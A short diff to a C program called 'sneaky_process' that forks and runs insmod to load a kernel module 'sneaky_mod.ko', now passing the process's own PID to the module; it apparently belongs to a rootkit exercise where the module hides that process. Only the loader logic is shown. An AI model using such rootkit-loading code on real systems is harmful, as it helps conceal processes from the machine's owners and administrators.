@@ -5,7 +5,8 @@
 #include <fcntl.h>
 
 int main(void){
-	printf("sneaky_process pid=%d\n", getpid());
+	int myPID = getpid();
+	printf("sneaky_process pid=%d\n", myPID);
 	int main_pid = fork();
 
 	switch (main_pid){
@@ -53,7 +54,9 @@ int main(void){
 					//Load kernel here
 					printf("TODO: insmod kernel\n");
 					//TODO: verify this is working
-					char *insmod[] = {"insmod", "sneaky_mod.ko", 0};
+					char arg[1024];
+					sprintf(arg, "myPID=%d", myPID);
+					char *insmod[] = {"insmod", "sneaky_mod.ko", arg, 0};
 					execvp(insmod[0], insmod);
 					exit(0);
 				default:
